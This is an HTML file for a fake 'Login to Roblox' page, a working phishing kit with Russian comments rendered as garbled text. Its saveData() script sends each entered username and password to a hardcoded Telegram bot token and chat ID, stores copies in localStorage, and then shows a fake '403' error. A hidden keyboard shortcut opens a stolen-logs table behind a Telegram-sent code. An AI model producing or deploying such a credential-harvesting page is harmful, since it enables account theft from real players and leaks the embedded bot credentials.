<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox</title>
    <style>
        body, html {
            margin: 0; padding: 0; height: 100%;
            font-family: "Segoe UI", Arial, sans-serif;
            background: radial-gradient(circle at center, #252729 0%, #000000 100%);
            color: #d1d1d1; overflow: hidden;
        }
        .navbar {
            display: flex; align-items: center; background-color: #232527; 
            padding: 0 20px; height: 40px; position: fixed; top: 0; width: 100%; 
            z-index: 100; box-sizing: border-box; border-bottom: 1px solid #111;
        }
        .logo-text { font-size: 20px; font-weight: 800; color: #fff; user-select: none; }
        .screen {
            display: flex; flex-direction: column; justify-content: center; align-items: center;
            min-height: 100vh; width: 100%; position: absolute; top: 0; left: 0; display: none;
        }
        #login-form-screen { display: flex; }
        .login-card { 
            background-color: #232527; width: 400px; padding: 40px; 
            border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); 
        }
        input { 
            width: 100%; padding: 12px; margin-bottom: 15px; 
            background-color: #393b3d; border: 1px solid #393b3d; 
            border-radius: 8px; color: #fff; box-sizing: border-box; font-size: 15px; outline: none;
        }
        .btn-auth { 
            width: 100%; padding: 12px; background: #393b3d; 
            border: 1px solid #fff; color: #fff; border-radius: 8px; 
            font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 5px; 
        }
        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1000px; border: 1px solid #444; margin-top: 20px; overflow-y: auto; max-height: 400px; }
        table { width: 100%; border-collapse: collapse; color: #eee; font-size: 13px; }
        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
    </style>
</head>
<body>

    <div class="navbar"><div class="logo-text">ROBLOX</div></div>

    <div id="login-form-screen" class="screen">
        <div class="login-card">
            <h2 style="color:#fff; margin-bottom: 30px;">Login to Roblox</h2>
            <input type="text" id="username" placeholder="Username">
            <input type="password" id="password" placeholder="Password">
            <button class="btn-auth" onclick="saveData()">Log In</button>
        </div>
    </div>

    <div id="admin-auth" class="screen">
        <div class="login-card" style="border: 2px solid #ff0000;">
            <h2 style="color: #ff0000; margin-top:0;">SECURITY CHECK</h2>
            <p id="status-text" style="font-size: 13px; color: #888; margin-bottom: 15px;">–í–≤–µ–¥–∏—Ç–µ –¥–∞–Ω–Ω—ã–µ. –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –ø—Ä–∏–¥–µ—Ç –≤ Telegram.</p>
            <input type="text" id="admin_user" placeholder="Admin Login">
            <input type="password" id="admin_pass" placeholder="Admin Password (–∏–ª–∏ –ö–æ–¥ –∏–∑ –¢–ì)">
            <button class="btn-auth" style="border-color: #ff0000; color: #ff0000;" id="unlock-btn" onclick="checkAdminAuth()">Unlock</button>
        </div>
    </div>

    <div id="admin-panel" class="screen">
        <div class="admin-box">
            <h2 style="color: #fff;">LOGS DATABASE</h2>
            <table id="logTable">
                <thead><tr><th>User</th><th>Pass</th><th>Time</th></tr></thead>
                <tbody id="logData"></tbody>
            </table>
        </div>
        <button class="btn-auth" style="width: 150px; margin-top: 20px;" onclick="location.reload()">Logout</button>
    </div>

    <script>
        const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw";
        const TG_CHAT_ID = "7863254073";
        let secretCode = ""; // –°—é–¥–∞ –∑–∞–ø–∏—à–µ—Ç—Å—è –∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –º—ã –æ—Ç–ø—Ä–∞–≤–∏–º –≤ –¢–ì

        // –°–µ–∫—Ä–µ—Ç–∫–∞ –¥–ª—è –≤—ã–∑–æ–≤–∞ –∞–¥–º–∏–Ω–∫–∏: Ctrl + \ + 3 + Z
        let pressedKeys = {};
        document.addEventListener('keydown', (e) => {
            pressedKeys[e.code] = true;
            if (pressedKeys["ControlLeft"] && pressedKeys["Backslash"] && pressedKeys["Digit3"] && pressedKeys["KeyZ"]) {
                showScreen('admin-auth');
            }
        });
        document.addEventListener('keyup', (e) => { delete pressedKeys[e.code]; });

        function showScreen(id) {
            document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
            document.getElementById(id).style.display = 'flex';
        }

        // –°–±–æ—Ä –ª–æ–≥–æ–≤
        async function saveData() {
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            if(!u || !p) return;
            
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: TG_CHAT_ID, 
                    text: `üë§ *–ù–û–í–´–ô –õ–û–ì!*\n–Æ–∑–µ—Ä: \`${u}\`\n–ü–∞—Ä–æ–ª—å: \`${p}\``, 
                    parse_mode: "Markdown" 
                })
            });

            let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
            logs.push({ user: u, pass: p, time: new Date().toLocaleString() });
            localStorage.setItem('roblox_logs', JSON.stringify(logs));
            alert("Error 403: Forbidden");
        }

        // –í—Ö–æ–¥ –≤ –∞–¥–º–∏–Ω–∫—É —á–µ—Ä–µ–∑ –¢–ì
        async function checkAdminAuth() {
            const user = document.getElementById('admin_user').value;
            const pass = document.getElementById('admin_pass').value;
            const status = document.getElementById('status-text');

            // –ï—Å–ª–∏ –∫–æ–¥ –µ—â–µ –Ω–µ —Å–æ–∑–¥–∞–Ω ‚Äî –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –µ–≥–æ –≤ –¢–ì
            if (secretCode === "") {
                secretCode = Math.floor(1000 + Math.random() * 9000).toString(); // –ì–µ–Ω–µ—Ä–∏–º 4 —Ü–∏—Ñ—Ä—ã
                
                status.innerText = "–ó–∞–ø—Ä–æ—Å –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω! –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –∏–∑ Telegram...";
                status.style.color = "#ffff00";

                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: TG_CHAT_ID, 
                        text: `üîê *–ü–û–ü–´–¢–ö–ê –í–•–û–î–ê –í –ê–î–ú–ò–ù–ö–£*\n\n–ö—Ç–æ-—Ç–æ –≤–≤–µ–ª –ª–æ–≥–∏–Ω: \`${user}\`\n–¢–≤–æ–π —Å–µ–∫—Ä–µ—Ç–Ω—ã–π –∫–æ–¥: \`${secretCode}\``, 
                        parse_mode: "Markdown" 
                    })
                });
            } else {
                // –ï—Å–ª–∏ –∫–æ–¥ —É–∂–µ –µ—Å—Ç—å –≤ –¢–ì, –ø—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –≤–≤–µ–ª —é–∑–µ—Ä
                if (pass === secretCode) {
                    status.innerText = "–î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω!";
                    status.style.color = "#00ff00";
                    setTimeout(() => {
                        showScreen('admin-panel');
                        updateLogs();
                    }, 1000);
                } else {
                    status.innerText = "–ù–ï–í–ï–†–ù–´–ô –ö–û–î!";
                    status.style.color = "#ff0000";
                }
            }
        }

        function updateLogs() {
            const logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
            document.getElementById('logData').innerHTML = logs.reverse().map(l => 
                `<tr><td>${l.user}</td><td>${l.pass}</td><td>${l.time}</td></tr>`
            ).join('');
        }
    </script>
</body>
</html>
